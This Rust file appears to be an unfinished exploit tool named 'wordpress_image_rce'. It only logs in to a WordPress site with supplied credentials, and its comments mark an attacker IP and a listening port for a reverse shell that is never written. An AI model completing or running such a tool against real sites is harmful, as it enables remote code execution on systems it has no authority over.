use anyhow::{anyhow, Result};
use reqwest::blocking::Client;
use std::time::Duration;
use std::{env, process::exit};

fn main() -> Result<()> {
    let mut args: Vec<String> = env::args().collect();

    if args.len() != 5 {
        usage();
        exit(1);
    }

    let http_timeout = Duration::from_secs(10);
    let http_client = Client::builder()
        .timeout(http_timeout)
        .cookie_store(true)
        .build()?;

    let url = args.remove(1).trim_end_matches("/").to_string();
    let username = args.remove(1);
    let password = args.remove(1);
    let wp_theme = args.remove(1);

    // lhost = '10.10.10.10' #attacker ip
    // lport = '4141' #listening port

    let now = chrono::Utc::now();
    let date = now.format("%Y/%m/");
    println!("{}", date);

    let body1 = [("log", username.clone()), ("pwd", password.clone())];
    let url1 = format!("{}/wp-login.php", &url);
    let res1 = http_client.post(url1).form(&body1).send()?;

    if res1.status().as_u16() == 200 {
        println!("[+] Login successful.");
    } else {
        return Err(anyhow!("[-] Failed to login."));
    }

    Ok(())
}

fn usage() {
    println!(
        "Usage:
wordpress_image_rce <http://[IP]:[PORT]/> <Username> <Password> <WordPress_theme>"
    )
}
